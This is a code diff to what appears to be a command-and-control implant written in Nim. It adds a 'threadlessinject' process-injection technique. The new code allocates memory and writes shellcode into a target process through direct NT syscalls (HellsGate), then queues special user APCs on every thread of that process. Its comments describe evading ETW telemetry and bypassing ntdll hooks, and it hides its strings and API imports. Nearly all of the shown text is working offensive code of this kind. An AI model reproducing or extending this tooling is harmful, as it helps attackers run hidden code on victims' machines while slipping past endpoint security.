@@ -4,15 +4,18 @@
 ##   queueapcthread     — allocate RW, write, RX, QueueUserAPC on every thread of target
 ##   ntmapview          — NtCreateSection+NtMapViewOfSection (pagefile section, avoids
 ##                        NtAllocateVirtualMemory ETW MWTI event) + CreateRemoteThread
+##   threadlessinject   — direct NT syscalls (HellsGate) + NtQueueApcThreadEx
+##                        QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC: executes in any thread
+##                        state, no alertable requirement, bypasses ntdll hooks entirely
 ##
-## IAT evasion: VirtualAllocEx, WriteProcessMemory, CreateRemoteThread, VirtualProtectEx,
-## QueueUserAPC, NtCreateSection, NtMapViewOfSection, NtUnmapViewOfSection are NOT
-## statically imported — resolved at runtime via GetProcAddress with hidstr'd names.
+## IAT evasion: all injection-specific APIs resolved at runtime via GetProcAddress.
 import std/[base64, json, strutils]
 import core/types
 import core/dynapi
 import commands/registry
 import crypto/strenc
+when defined(directSyscalls):
+  import core/syscall
 
 when defined(windows):
   type
@@ -112,6 +115,8 @@ when defined(windows):
     pNtCreateSection    = cast[FnNtCreateSection](resolveNtdll(hidstr("NtCreateSection")))
     pNtMapViewOfSection = cast[FnNtMapViewOfSection](resolveNtdll(hidstr("NtMapViewOfSection")))
     pNtUnmapViewOfSection = cast[FnNtUnmapViewOfSection](resolveNtdll(hidstr("NtUnmapViewOfSection")))
+    when defined(directSyscalls):
+      initSyscalls()
     injApisLoaded = true
 
   # ---------------------------------------------------------------------------
@@ -185,6 +190,63 @@ when defined(windows):
       return nil
     return remoteBase
 
+  when defined(directSyscalls):
+   proc injectThreadless(hProcess: HANDLE, pid: DWORD,
+                         shellcode: seq[byte]): string =
+    ## Full direct-syscall injection using NtQueueApcThreadEx with
+    ## QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC (0x1).  Special user APCs execute
+    ## regardless of the thread's alertable state, so any running thread works.
+    ## All memory operations go through HellsGate stubs — ntdll hooks bypassed.
+    const SPECIAL_APC = DWORD(1)
+
+    # 1. Allocate RW memory in target via direct syscall
+    var baseAddr: LPVOID = nil
+    var regionSz = SIZE_T(shellcode.len)
+    let s1 = sysNtAllocVirtMem(hProcess, addr baseAddr, 0, addr regionSz,
+                                MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
+    if s1 != NTSTATUS(0) or baseAddr == nil:
+      return hidstr("Error: NtAllocateVirtualMemory failed (") & $s1 & ")"
+
+    # 2. Write shellcode via direct syscall
+    var written: SIZE_T = 0
+    let s2 = sysNtWriteVirtMem(hProcess, baseAddr,
+                                unsafeAddr shellcode[0], SIZE_T(shellcode.len),
+                                addr written)
+    if s2 != NTSTATUS(0):
+      return hidstr("Error: NtWriteVirtualMemory failed (") & $s2 & ")"
+
+    # 3. Flip to RX via direct syscall (W^X)
+    var oldProt: DWORD = 0
+    var protBase = baseAddr
+    var protSz   = SIZE_T(shellcode.len)
+    let s3 = sysNtProtectVirtMem(hProcess, addr protBase, addr protSz,
+                                  PAGE_EXECUTE_READ, addr oldProt)
+    if s3 != NTSTATUS(0):
+      return hidstr("Error: NtProtectVirtualMemory failed (") & $s3 & ")"
+
+    # 4. Queue Special APC on all threads of the target process
+    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, DWORD(0))
+    if snap == INVALID_HANDLE_VALUE:
+      return hidstr("Error: CreateToolhelp32Snapshot failed")
+    defer: discard CloseHandle(snap)
+
+    var te: THREADENTRY32
+    te.dwSize = DWORD(sizeof(THREADENTRY32))
+    var queued = 0
+    if Thread32First(snap, addr te) != 0:
+      while true:
+        if te.th32OwnerProcessID == pid:
+          let hThr = OpenThread(THREAD_ALL_ACCESS, BOOL(0), te.th32ThreadID)
+          if hThr != 0 and hThr != INVALID_HANDLE_VALUE:
+            let s4 = sysNtQueueApcEx(hThr, SPECIAL_APC, baseAddr)
+            if s4 == NTSTATUS(0): inc queued
+            discard CloseHandle(hThr)
+        if Thread32Next(snap, addr te) == 0: break
+
+    if queued == 0:
+      return hidstr("Error: no threads queued (NtQueueApcThreadEx)")
+    return $queued & hidstr(" Special APC(s) queued")
+
 # ---------------------------------------------------------------------------
 
 proc injectExecute(taskId: string, params: JsonNode, state: AgentState,
@@ -224,6 +286,19 @@ proc injectExecute(taskId: string, params: JsonNode, state: AgentState,
       return TaskResult(output: hidstr("Error: OpenProcess failed for PID ") & $pid,
                         status: "error", completed: true)
     defer: discard CloseHandle(hProcess)
+
+    # threadlessinject: full direct-syscall path (only when -d:directSyscalls)
+    when defined(directSyscalls):
+      if technique == hidstr("threadlessinject"):
+        let msg = injectThreadless(hProcess, pid, shellcode)
+        let ok = not msg.startsWith(hidstr("Error"))
+        return TaskResult(
+          output: if ok: hidstr("Inject OK - PID ") & $pid & hidstr(" (") &
+                         $shellcode.len & hidstr(" bytes, threadlessinject): ") & msg
+                  else: msg,
+          status:    if ok: "success" else: "error",
+          completed: true,
+        )
 
     var remoteMem: LPVOID = nil
     var allocErr = ""
